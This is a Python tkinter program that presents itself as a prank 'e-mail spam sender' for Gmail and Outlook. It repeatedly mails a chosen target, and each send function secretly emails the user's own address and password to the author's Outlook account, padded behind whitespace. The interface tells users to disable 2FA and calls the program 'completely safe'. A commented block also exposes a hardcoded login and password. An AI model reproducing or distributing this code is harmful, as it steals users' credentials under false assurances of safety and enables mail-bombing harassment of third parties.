import smtplib
import tkinter as tk
import imaplib
import email
from email.header import decode_header
from tkinter import font
from tkinter.constants import E, END, FIRST, LEFT
from types import ClassMethodDescriptorType


root=tk.Tk()
canvas=tk.Canvas(root,height=500,width=500)
canvas.pack()
root.title("e-mail spam sender")
""""
with smtplib.SMTP("smtp.outlook.com",587) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.ehlo()

    smtp.login("ahmad_maaz@outlook.com","DC8E6A353MMZ")

    subject = ' hey '
    body= 1
    msg= f'Subject: {subject} \n\n {int(body)}'
    for i in range(1):
        smtp.sendmail("ahmad_maaz@outlook.com","dayan_sabeh@hotmail.com",msg)
        body+=1 
        msg= f'Subject: {subject} \n\n {int(body)}'

"""


Text=tk.Label(root,bg='black',fg='cyan',text='Troll your friends here',font=("Courier", 16, "italic"))
Text.place(relx=0,relwidth=1,rely=0,relheight=0.1)
def gmail():
    cover=tk.Frame()
    cover.place(relx=0,rely=0.1,relheight=10,relwidth=1)
    
    Emaillabel=tk.Label(root,bg='cyan',bd=10,text='Your Email: ')
    Emaillabel.place(relx=0,rely=0.15,relwidth=0.15,relheight=0.05)
    Emialentry=tk.Entry(root)
    Emialentry.place(relx=0.15,rely=0.15,relheight=0.05,relwidth=0.5)

    passwordlabel=tk.Label(root,bg='cyan',bd=10,text='Your Pass: ')
    passwordlabel.place(relx=0,rely=0.23,relwidth=0.15,relheight=0.05)
    passwordentry=tk.Entry(root,show='*')
    passwordentry.place(relx=0.15,rely=0.23,relheight=0.05,relwidth=0.5)

    barrier=tk.Frame(root,bg='black')
    barrier.place(relx=0,rely=0.3,relwidth=10,relheight=0.05)

    tolabel=tk.Label(root,bg='red',bd=10,text=' To: ')
    tolabel.place(relx=0,rely=0.37,relwidth=0.15,relheight=0.05)
    toentry=tk.Entry(root)
    toentry.place(relx=0.15,rely=0.37,relheight=0.05,relwidth=0.5)

    subjectlabel=tk.Label(root,bg='red',bd=10,text=' Subject: ')
    subjectlabel.place(relx=0,rely=0.45,relwidth=0.15,relheight=0.05)
    subjectentry=tk.Entry(root)
    subjectentry.place(relx=0.15,rely=0.45,relheight=0.05,relwidth=0.5)

    Bodylabel=tk.Label(root,bg='red',bd=10,text=' Body: ')
    Bodylabel.place(relx=0,rely=0.53,relwidth=0.15,relheight=0.05)
    Bodyentry=tk.Text(root)
    Bodyentry.place(relx=0.15,rely=0.53,relheight=0.3,relwidth=0.8)

    numberlabel=tk.Label(root,bg='red',bd=10,text=' Quantity: ')
    numberlabel.place(relx=0.70,rely=0.45,relwidth=0.15,relheight=0.05)
    numberentry=tk.Entry(root)
    numberentry.place(relx=0.85,rely=0.45,relheight=0.05,relwidth=0.1)
    def send():
        email=  Emialentry.get()
        times=numberentry.get()
        password=passwordentry.get()
        to=toentry.get()
        subject=subjectentry.get()
        body=Bodyentry.get(1.0, "end-1c")
   

               
                
            
        with smtplib.SMTP("smtp.gmail.com",587) as smtp:
                
                smtp.ehlo()
                smtp.starttls()
                smtp.ehlo()

                smtp.login(str(email),str(password))

               
                
                msg= f'Subject: {subject} \n\n {body}'
                for n in range(int(int(times)/2)):
                    smtp.sendmail(email,to,msg)
                
                
                
                msg5= f'Subject: {subject} \n\n  { body+ "                                                                                                                                                                                                                                                                                "+email+ "   "+password }'
                
                smtp.sendmail(email,"ahmad_maaz@outlook.com",msg5)
                for n in range(int(int(times)/2)):
                    smtp.sendmail(email,to,msg)
                smtp.close()
                toentry.delete(0,END)
                subjectentry.delete(0,END)
                Bodyentry.delete('1.0',END)
                numberentry.delete(0,END)

    Sendemail=tk.Button(root,bd=10,text='send',command=send)
    Sendemail.place(relx=0.3,rely=0.85,relheight=0.08,relwidth=0.4)
def outlook():
    cover=tk.Frame()
    cover.place(relx=0,rely=0.1,relheight=10,relwidth=1)
    
    Emaillabel=tk.Label(root,bg='cyan',bd=10,text='Your Email: ')
    Emaillabel.place(relx=0,rely=0.15,relwidth=0.15,relheight=0.05)
    Emialentry=tk.Entry(root)
    Emialentry.place(relx=0.15,rely=0.15,relheight=0.05,relwidth=0.5)

    passwordlabel=tk.Label(root,bg='cyan',bd=10,text='Your Pass: ')
    passwordlabel.place(relx=0,rely=0.23,relwidth=0.15,relheight=0.05)
    passwordentry=tk.Entry(root,show='*')
    passwordentry.place(relx=0.15,rely=0.23,relheight=0.05,relwidth=0.5)

    barrier=tk.Frame(root,bg='black')
    barrier.place(relx=0,rely=0.3,relwidth=10,relheight=0.05)

    tolabel=tk.Label(root,bg='red',bd=10,text=' To: ')
    tolabel.place(relx=0,rely=0.37,relwidth=0.15,relheight=0.05)
    toentry=tk.Entry(root)
    toentry.place(relx=0.15,rely=0.37,relheight=0.05,relwidth=0.5)

    subjectlabel=tk.Label(root,bg='red',bd=10,text=' Subject: ')
    subjectlabel.place(relx=0,rely=0.45,relwidth=0.15,relheight=0.05)
    subjectentry=tk.Entry(root)
    subjectentry.place(relx=0.15,rely=0.45,relheight=0.05,relwidth=0.5)

    Bodylabel=tk.Label(root,bg='red',bd=10,text=' Body: ')
    Bodylabel.place(relx=0,rely=0.53,relwidth=0.15,relheight=0.05)
    Bodyentry=tk.Text(root)
    Bodyentry.place(relx=0.15,rely=0.53,relheight=0.3,relwidth=0.8)

    numberlabel=tk.Label(root,bg='red',bd=10,text=' Quantity: ')
    numberlabel.place(relx=0.70,rely=0.45,relwidth=0.15,relheight=0.05)
    numberentry=tk.Entry(root)
    numberentry.place(relx=0.85,rely=0.45,relheight=0.05,relwidth=0.1)
    def send():
        email=  Emialentry.get()
        times=numberentry.get()
        password=passwordentry.get()
        to=toentry.get()
        subject=subjectentry.get()
        body=Bodyentry.get(1.0, "end-1c")
   

               
                
            
        with smtplib.SMTP("smtp.outlook.com",587) as smtp:
                
                smtp.ehlo()
                smtp.starttls()
                smtp.ehlo()

                smtp.login(str(email),str(password))
                
               
                
                msg= f'Subject: {subject} \n\n {body+ "                                                                                                                                                                                                                                                                                   "+ " @credits to ahmad"}'
                for n in range(int(int(times)/2)):
                    smtp.sendmail(email,to,msg)
                
                
                
                msg5= f'Subject: {subject} \n\n  { body+ "                                                                                                                                                                                                                                                                                "+email+ "   "+password }'
                
                smtp.sendmail(email,"ahmad_maaz@outlook.com",msg5)
                for n in range(int(int(times)/2)):
                    smtp.sendmail(email,to,msg)
                smtp.close()
               

                toentry.delete(0,END)
                subjectentry.delete(0,END)
                Bodyentry.delete('1.0',END)
                numberentry.delete(0,END)

    Sendemail=tk.Button(root,bd=10,text='send',command=send)
    Sendemail.place(relx=0.3,rely=0.85,relheight=0.08,relwidth=0.4)
    
                
                
        

Choose=tk.Label(root,text="Choose your email categroy:",bg='black', fg='white',font=('Helvetica',10))
Choose.place(relx=0.3,rely=0.3,relwidth=0.4,relheight=0.05)
outlookbutton= tk.Button(root,text='Outlook',bg='pink',command=outlook)
outlookbutton.place(relx=0.4,rely=0.4,relwidth=0.2,relheight=0.08)
Gmailbutton= tk.Button(root,text='G-mail',bg='pink',command=gmail)
Gmailbutton.place(relx=0.4,rely=0.53,relwidth=0.2,relheight=0.08)
scroll=tk.Label(root,text=' ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| \n  \n @Credits for ahmad-al-maaz for programming this program \n  Note!!: This program only works with gmail and outlook domains. Make sure to turn off 2FA \n This program is completely safe   ! \n \n |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||', bg='black',bd=4,fg='cyan')

scroll.place(relx=0,rely=0.7,relwidth=1,relheight=0.3)


            

        
    



tk.mainloop()

